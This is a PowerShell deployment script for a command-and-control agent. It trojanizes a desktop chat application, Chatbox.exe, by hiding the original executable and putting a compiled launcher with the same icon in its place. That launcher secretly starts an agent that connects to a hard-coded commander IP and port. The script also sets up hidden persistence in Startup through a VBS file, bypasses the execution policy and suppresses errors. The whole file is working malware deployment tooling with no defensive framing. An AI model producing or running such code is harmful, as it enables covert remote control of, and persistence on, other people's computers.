param(
    [string]$TargetExe = "",
    [string]$CommanderIP = "100.104.20.122",
    [int]$CommanderPort = 15000,
    [switch]$RegisterStartup,
    [switch]$RestoreOriginal
)

$ErrorActionPreference = "SilentlyContinue"
$C2Dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$DataDir = "$env:USERPROFILE\.chatbox-c2"
$null = New-Item -ItemType Directory -Path $DataDir -Force

Write-Host "=== C2 Silent Deployment ===" -ForegroundColor Cyan

if ($RestoreOriginal) {
    if ($TargetExe -and (Test-Path "$TargetExe.bak")) {
        Move-Item "$TargetExe.bak" $TargetExe -Force
        Write-Host "[+] Restored original: $TargetExe" -ForegroundColor Green
    }
    Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2-Agent.lnk" -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Removed startup entry" -ForegroundColor Yellow
    return
}

# === 1. Find target executable ===
if (-not $TargetExe) {
    $candidates = @(
        "$PSScriptRoot\..\Chatbox.exe",
        "$PSScriptRoot\..\..\Chatbox.exe",
        "$PSScriptRoot\..\..\..\Chatbox.exe",
        "$PSScriptRoot\..\Chatbox Modified.exe"
    )
    foreach ($c in $candidates) {
        $c = (Resolve-Path $c -ErrorAction SilentlyContinue).Path
        if ($c -and (Test-Path $c)) { $TargetExe = $c; break }
    }
    if (-not $TargetExe) {
        $TargetExe = Read-Host "Enter path to the program .exe to cloak"
    }
}

if (-not (Test-Path $TargetExe)) {
    Write-Host "[!] Target not found: $TargetExe" -ForegroundColor Red
    exit 1
}

$TargetDir = Split-Path $TargetExe -Parent
$TargetName = Split-Path $TargetExe -Leaf
$BackupPath = "$TargetDir\$TargetName.bak"

Write-Host "[+] Target: $TargetExe" -ForegroundColor Yellow

# === 2. Write server config ===
@"
RELAY_IP=$CommanderIP
RELAY_PORT=$CommanderPort
"@ | Set-Content -Path "$C2Dir\server.cfg" -Encoding ASCII
Write-Host "[+] Server config written (Commander: $CommanderIP`:$CommanderPort)" -ForegroundColor Green

# === 3. Copy C2 files to target's c2 folder ===
$TargetC2 = "$TargetDir\c2"
$null = New-Item -ItemType Directory -Path $TargetC2 -Force
Copy-Item "$C2Dir\agent.ps1" "$TargetC2\agent.ps1" -Force
Copy-Item "$C2Dir\server.cfg" "$TargetC2\server.cfg" -Force
Write-Host "[+] C2 agent copied to: $TargetC2" -ForegroundColor Green

# === 4. Rename original exe (hidden) ===
if (-not (Test-Path $BackupPath)) {
    Move-Item $TargetExe $BackupPath -Force
    # Hide the backup
    attrib +h +s $BackupPath
    Write-Host "[+] Original hidden as: $BackupPath" -ForegroundColor Green
} else {
    Write-Host "[+] Backup already exists: $BackupPath" -ForegroundColor Yellow
}

# === 5. Compile launcher stub with original icon ===
Write-Host "[+] Compiling launcher stub..." -ForegroundColor Yellow
$csc = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
$stubOut = "$TargetDir\$TargetName"
$iconPath = "$env:TEMP\_c2_icon.ico"

# Extract icon from backup
try {
    Add-Type -AssemblyName System.Drawing
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($BackupPath)
    if ($icon) {
        $fs = New-Object System.IO.FileStream $iconPath, ([System.IO.FileMode]::Create)
        $icon.Save($fs)
        $fs.Close()
        Write-Host "[+] Icon extracted from original: $iconPath" -ForegroundColor Green
    }
} catch {
    Write-Host "[!] Could not extract icon: $_" -ForegroundColor Yellow
}

$iconArg = if (Test-Path $iconPath) { "/win32icon:`"$iconPath`"" } else { "" }

# Copy launcher.cs locally, compile
$csSrc = "$C2Dir\launcher.cs"
if (-not (Test-Path $csSrc)) {
    Write-Host "[!] launcher.cs not found at $csSrc" -ForegroundColor Red
    exit 1
}

& $csc /target:winexe /out:"$stubOut" $iconArg /reference:"System.dll" /reference:"System.Core.dll" "$csSrc" 2>&1 | Out-Null

if (Test-Path $stubOut) {
    Write-Host "[+] Launcher compiled: $stubOut ($((Get-Item $stubOut).Length / 1024) KB)" -ForegroundColor Green
} else {
    Write-Host "[!] Compilation failed! Falling back to batch + shortcut method..." -ForegroundColor Red
    # Fallback: create batch + shortcut
    $batPath = "$TargetDir\$TargetName.bat"
    "@echo off
start "" `"%~dp0$TargetName.bak`"
start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"%~dp0c2\agent.ps1`"" | Set-Content $batPath -Encoding ASCII
    
    $wshell = New-Object -ComObject WScript.Shell
    $lnkPath = "$TargetDir\$TargetName.lnk"
    $shortcut = $wshell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = $batPath
    $shortcut.WindowStyle = 7
    try { $shortcut.IconLocation = "$BackupPath,0" } catch {}
    $shortcut.Save()
    
    # Hide the original
    attrib +h $BackupPath
    # Hide the bat
    attrib +h $batPath
    
    Write-Host "[!] Fallback shortcut created: $lnkPath" -ForegroundColor Yellow
    Write-Host "[!] Original .bat hidden: $batPath" -ForegroundColor Yellow
}

# Clean up temp icon
Remove-Item $iconPath -Force -ErrorAction SilentlyContinue

# === 6. Register Windows startup ===
if ($RegisterStartup) {
    $startupDir = [Environment]::GetFolderPath("Startup")
    $lnkPath = "$startupDir\C2-Agent.lnk"
    
    # We'll use a VBS script in startup that runs the agent completely silently
    $vbsPath = "$DataDir\startup-c2.vbs"
@"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetC2\agent.ps1`"", 0, False
"@ | Set-Content $vbsPath -Encoding ASCII
    
    $wshell = New-Object -ComObject WScript.Shell
    $shortcut = $wshell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "wscript.exe"
    $shortcut.Arguments = "`"$vbsPath`""
    $shortcut.WindowStyle = 7
    $shortcut.Description = "C2 Agent"
    $shortcut.Save()
    
    Write-Host "[+] Startup registered: $lnkPath" -ForegroundColor Green
}

# === 7. Verify && launch ===
Write-Host ""
Write-Host "[+] === DEPLOYMENT COMPLETE ===" -ForegroundColor Cyan
Write-Host "    Original:    $BackupPath (hidden)" -ForegroundColor Gray
if (Test-Path $stubOut) {
    Write-Host "    Launcher:    $stubOut (replaces original)" -ForegroundColor Gray
}
Write-Host "    C2 Agent:    $TargetC2\agent.ps1" -ForegroundColor Gray
Write-Host "    Commander:   $CommanderIP`:$CommanderPort" -ForegroundColor Gray
if ($RegisterStartup) {
    Write-Host "    Auto-start:  Registered (reconnects on reboot)" -ForegroundColor Gray
}
Write-Host ""
Write-Host "[+] Launching agent now..." -ForegroundColor Cyan

# Start agent silently
$psArg = "-NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetC2\agent.ps1`""
Start-Process powershell.exe -ArgumentList $psArg -WindowStyle Hidden

Write-Host "[+] Agent is running silently." -ForegroundColor Green
